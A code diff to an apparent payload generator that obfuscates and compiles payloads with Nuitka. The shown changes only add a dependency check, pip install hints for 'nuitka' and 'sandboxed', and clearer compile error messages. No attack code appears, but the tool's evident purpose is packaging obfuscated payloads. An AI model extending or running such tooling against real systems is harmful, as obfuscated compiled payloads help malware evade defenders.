@@ -783,6 +783,27 @@ class Generator:
             print(f"[!] Obfuscation error: {e}")
             return False
     
+    def _check_compile_deps(self):
+        """Check Nuitka/sandboxed are available; tell user to pip install if not."""
+        result = subprocess.run(
+            [sys.executable, "-m", "nuitka", "--version"],
+            capture_output=True,
+            text=True,
+        )
+        if result.returncode != 0:
+            err = (result.stderr or result.stdout or "").lower()
+            if "no module named" in err or "nuitka" in err:
+                print("[!] Nuitka is not installed. Install optional build dependencies with:")
+                print("    pip install nuitka sandboxed")
+            return False
+        try:
+            import sandboxed  # noqa: F401
+        except ImportError:
+            print("[!] The 'sandboxed' module is required for compilation. Install with:")
+            print("    pip install sandboxed")
+            return False
+        return True
+
     def compile(self):
         """
         Compile the payload to binary using Nuitka in the temp workspace.
@@ -791,6 +812,8 @@ class Generator:
             bool: True if successful, False otherwise
         """
         try:
+            if not self._check_compile_deps():
+                return False
             if not self._create_tmp_workspace():
                 return False
             
@@ -876,7 +899,12 @@ class Generator:
                     return False
             else:
                 print("[!] Compilation failed")
-                print(f"[!] Error: {result.stderr[:500]}")  # Print first 500 chars
+                err = (result.stderr or result.stdout or "")
+                if "No module named" in err or "nuitka" in err:
+                    print("[!] Install optional build dependencies with:")
+                    print("    pip install nuitka sandboxed")
+                else:
+                    print(f"[!] Error: {err[:500]}")
                 return False
                 
         except Exception as e:
